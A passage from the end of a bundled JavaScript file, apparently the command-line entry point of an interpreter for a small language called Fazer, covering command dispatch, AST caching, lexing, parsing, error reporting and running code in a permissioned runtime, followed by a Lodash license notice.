      console.log(colors.green(args2.join(" ").split("").reverse().join("")));
    }
  };
  if (CLI_COMMANDS[cmd]) {
    await CLI_COMMANDS[cmd](argv.slice(1));
    return;
  }
  let fileArg = null;
  let forwarded = [];
  if (cmd === "build") {
    try {
      const builder = require_builder();
      await builder(argv[1], argv.slice(2));
    } catch (e) {
      console.error(e);
    }
    return;
  }
  if (cmd === "run") {
    fileArg = argv[1];
    if (!fileArg) usage();
    const sep = argv.indexOf("--");
    forwarded = sep >= 0 ? argv.slice(sep + 1) : [];
  } else {
    if (cmd.endsWith(".fz") || fs.existsSync(cmd)) {
      fileArg = cmd;
      forwarded = argv.slice(1);
    } else {
      console.error(`Unknown command or file not found: '${cmd}'
`);
      usage();
    }
  }
  const filePath = path.resolve(fileArg);
  if (!fs.existsSync(filePath)) {
    console.error(`File not found: ${filePath}`);
    process.exit(1);
  }
  let ast = null;
  let code = "";
  let useCache = false;
  const cachePath = filePath + ".cache";
  try {
    if (fs.existsSync(cachePath)) {
      const srcStat = fs.statSync(filePath);
      const cacheStat = fs.statSync(cachePath);
      if (cacheStat.mtimeMs > srcStat.mtimeMs) {
        const cachedData = JSON.parse(fs.readFileSync(cachePath, "utf8"));
        if (cachedData.version === require_package().version) {
          ast = cachedData.ast;
          code = fs.readFileSync(filePath, "utf8");
          useCache = true;
        }
      }
    }
  } catch (e) {
  }
  if (!useCache) {
    code = fs.readFileSync(filePath, "utf8");
    const lex = lexer.tokenize(code);
    if (lex.errors.length) {
      console.error("Lexer error:", lex.errors[0].message || String(lex.errors[0]));
      process.exit(1);
    }
    const parser = new FazerParser();
    parser.input = lex.tokens;
    try {
      ast = parser.program();
    } catch (e) {
      if (e.name === "FazerError") {
        console.error(prettyError(e, filePath, code));
        process.exit(1);
      }
      throw e;
    }
    if (parser.errors.length) {
      const e = parser.errors[0];
      const tok = e.token || (lex.tokens.length ? lex.tokens[0] : null);
      const meta = tok ? locOf(tok) : null;
      const ferr = new FazerError(e.message, meta || {});
      console.error(prettyError(ferr, filePath, code));
      process.exit(1);
    }
    try {
      fs.writeFileSync(cachePath, JSON.stringify({
        version: require_package().version,
        ast
      }), "utf8");
    } catch (e) {
    }
  }
  const rt = new FazerRuntime({ argv: forwarded, filename: filePath, code, permissions });
  try {
    await rt.run(ast);
  } catch (err) {
    if (err instanceof FazerError) {
      console.error(prettyError(err, filePath, code));
    } else {
      console.error(err && err.stack ? err.stack : String(err));
    }
    process.exit(1);
  }
}
module.exports = {
  Lexer,
  createToken,
  FazerParser,
  FazerRuntime,
  FazerError,
  lexer,
  prettyError,
  locOf
};
if (require.main === module) main().catch((e) => {
  console.error(e);
  process.exit(1);
});
/*! Bundled license information:

lodash-es/lodash.js:
  (**
   * @license
   * Lodash (Custom Build) <https://lodash.com/>
   * Build: `lodash modularize exports="es" -o ./`
   * Copyright OpenJS Foundation and other contributors <https://openjsf.org/>
   * Released under MIT license <https://lodash.com/license>
   * Based on Underscore.js 1.8.3 <http://underscorejs.org/LICENSE>
   * Copyright Jeremy Ashkenas, DocumentCloud and Investigative Reporters & Editors
   *)
*/
